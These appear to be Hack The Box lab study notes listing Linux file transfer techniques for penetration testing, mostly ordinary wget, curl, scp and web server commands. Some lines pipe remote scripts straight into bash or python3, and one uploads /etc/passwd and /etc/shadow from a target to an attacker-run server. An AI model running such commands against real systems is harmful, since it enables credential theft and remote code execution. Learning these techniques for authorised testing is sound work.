## **Download Operations**

### **Base64 Encoding / Decoding**

**Pwnbox - Check File MD5 hash**

```bash
md5sum id_rsa
```

**Pwnbox - Encode SSH Key to Base64**

```bash
cat id_rsa |base64 -w 0;echo
```

**On target - Decode the File**

```bash
echo -n '' | base64 -d > id_rsa
```

**On target - Confirm the MD5 Hashes Match**

```bash
md5sum id_rsa
```

### **Web Downloads with Wget and cURL**

**Download a File Using wget**

```bash
00Luffy00@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download a File Using cURL**

```bash
00Luffy00@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### **Fileless Attacks Using Linux**

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Fileless Download with cURL**

```bash
00Luffy00@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**Fileless Download with wget**

```bash
00Luffy00@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

### **Download with Bash (/dev/tcp)**

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

**Connect to the Target Webserver**

```bash
00Luffy00@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**

```bash
00Luffy00@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**

```bash
00Luffy00@htb[/htb]$ cat <&3
```

### **SSH Downloads**

`SCP`(secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

**Enabling the SSH Server**

```bash
00Luffy00@htb[/htb]$ sudo systemctl enable ssh
```

**Starting the SSH Server**

```bash
00Luffy00@htb[/htb]$ sudo systemctl start ssh
```

**Checking for SSH Listening Port**

```bash
00Luffy00@htb[/htb]$ netstat -lnpt
```

**On Target - Downloading Files Using SCP**

```bash
00Luffy00@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## **Upload Operations**

### **Web Upload**

**Pwnbox - Start Web Server**

```bash
00Luffy00@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```

**Pwnbox - Create a Self-Signed Certificate**

```bash
00Luffy00@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

**Pwnbox - Start Web Server**

```bash
00Luffy00@htb[/htb]$ mkdir https && cd https

00Luffy00@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Target - Upload Multiple Files**

```bash
00Luffy00@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### **Alternative Web File Transfer Method**

**Linux -  Creating a Web Server with Python3**

```bash
00Luffy00@htb[/htb]$ python3 -m http.server
```

**Linux -  Creating a Web Server with Python2.7**

```bash
00Luffy00@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

**Linux -  Creating a Web Server with PHP**

```bash
00Luffy00@htb[/htb]$ php -S 0.0.0.0:8000
```

**Linux -  Creating a Web Server with Ruby**

```bash
00Luffy00@htb[/htb]$ ruby -run -ehttpd . -p8000
```

**Download the File from the Target Machine onto the Pwnbox**

```bash
00Luffy00@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

**SCP Upload**

```bash
00Luffy00@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student
```
